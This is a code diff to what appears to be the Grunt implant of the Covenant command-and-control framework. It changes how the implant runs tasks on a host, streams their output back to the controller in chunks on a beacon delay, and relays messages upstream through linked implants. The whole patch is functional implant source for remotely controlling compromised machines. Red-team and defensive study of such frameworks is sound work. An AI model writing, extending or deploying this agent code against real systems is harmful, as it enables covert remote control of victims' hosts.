@@ -165,14 +165,14 @@ namespace BruteExecutor
                             }
                             else if (message.Token)
                             {
-                                Thread t = new Thread(() => TaskExecute(messenger, message));
+                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));
                                 t.Start();
                                 Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                 bool completed = t.Join(5000);
                             }
                             else
                             {
-                                Thread t = new Thread(() => TaskExecute(messenger, message));
+                                Thread t = new Thread(() => TaskExecute(messenger, message, Delay));
                                 t.Start();
                                 Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                             }
@@ -200,7 +200,7 @@ namespace BruteExecutor
             }
         }
 
-        private static void TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message)
+        private static void TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
         {
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
@@ -235,31 +235,53 @@ namespace BruteExecutor
                                     invokeThread.Start();
                                     using (StreamReader reader = new StreamReader(pipeServer))
                                     {
-                                        char[] read = new char[MAX_MESSAGE_SIZE];
-                                        int count;
+                                        object synclock = new object();
                                         string currentRead = "";
-                                        while ((count = reader.Read(read, 0, read.Length)) > 0)
-                                        {
-                                            try
+                                        Thread readThread = new Thread(() => {
+                                            int count;
+                                            char[] read = new char[MAX_MESSAGE_SIZE];
+                                            while ((count = reader.Read(read, 0, read.Length)) > 0)
                                             {
-                                                currentRead += new string(read, 0, count);
-                                                if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                lock (synclock)
                                                 {
-                                                    for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
-                                                    {
-                                                        string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                        try
-                                                        {
-                                                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
-                                                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                        }
-                                                        catch (Exception) {}
-                                                    }
-                                                    currentRead = "";
-                                                    lastTime = DateTime.Now;
+                                                    currentRead += new string(read, 0, count);
                                                 }
                                             }
-                                            catch (Exception) { currentRead = "";}
+                                        });
+                                        readThread.Start();
+                                        while (readThread.IsAlive)
+                                        {
+                                            Thread.Sleep(Delay * 1000);
+                                            lock (synclock)
+                                            {
+                                                try
+                                                {
+                                                    if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                    {
+                                                        for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
+                                                        {
+                                                            string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
+                                                            try
+                                                            {
+                                                                GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
+                                                                messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                            }
+                                                            catch (Exception) {}
+                                                        }
+                                                        currentRead = "";
+                                                        lastTime = DateTime.Now;
+                                                    }
+                                                    else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
+                                                    {
+                                                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
+                                                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                        currentRead = "";
+                                                        lastTime = DateTime.Now;
+                                                    }
+                                                }
+                                                catch (ThreadAbortException) { break; }
+                                                catch (Exception) { currentRead = ""; }
+                                            }
                                         }
                                         output += currentRead;
                                     }
@@ -321,11 +343,17 @@ namespace BruteExecutor
         public string Message { get; set; }
     }
 
+    public class MessageEventArgs : EventArgs
+    {
+        public string Message { get; set; }
+    }
+
     public interface IMessenger
     {
         string Hostname { get; }
         string Identifier { get; set; }
         string Authenticator { get; set; }
+        EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
         ProfileMessage Read();
         void Write(string Message);
         void Close();
@@ -388,6 +416,10 @@ namespace BruteExecutor
             this.Crafter = Crafter;
             this.UpstreamMessenger = Messenger;
             this.Profile = Profile;
+            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
+                this.QueueTaskingMessage(e.Message);
+                this.WriteTaskingMessage();
+            };
         }
 
         public GruntTaskingMessage ReadTaskingMessage()
@@ -489,6 +521,7 @@ namespace BruteExecutor
         public string Hostname { get; } = "";
         public string Identifier { get; set; } = "";
         public string Authenticator { get; set; } = "";
+        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
 
         private string CovenantURI { get; }
         private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
